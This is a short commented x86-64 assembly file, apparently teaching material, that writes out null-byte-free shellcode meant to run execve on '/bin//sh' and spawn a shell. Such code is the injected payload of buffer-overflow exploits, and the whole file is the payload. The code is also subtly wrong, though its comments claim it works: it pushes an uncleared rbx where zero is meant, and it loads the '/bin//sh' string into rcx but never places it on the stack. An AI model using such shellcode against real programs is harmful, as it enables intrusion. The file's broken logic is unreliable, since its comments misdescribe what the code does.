; shellcode.asm
; basic assembly code to create a shell
; avoids 0x00 zero bytes that would terminate input buffer

section .text
    global _start
    
_start:
    xor rax, rax ; zeroes out register
    push rbx ; adds a zero to stack (will terminate string)
    
    mov rdx, [rsp] ; parameter 3 is now 0 (value at top of stack)
    
    ; little endian (reverse order) of characters in "/bin//sh"
    ; notice the string is 8 characters, fills a 8 byte block
    mov rcx, 0x68732f2f6e69622f
    mov rdi, rsp ; parameter 2 is now char * ("/bin//sh")
    
    push rbx ; adds a zero to terminate array (char * argv[])
    push rdi ; adds ADDRESS pointing to string on stack (char *)
    
    mov rsi, rsp ; adds char * [] (address of array start)
    
    mov al, 59; sets operation to execve
    syscall ; execve ("/bin//sh", {"/bin//sh"}, NULL);
    
    mov al, 60
    xor rdi, rdi
    syscall ; exit 0
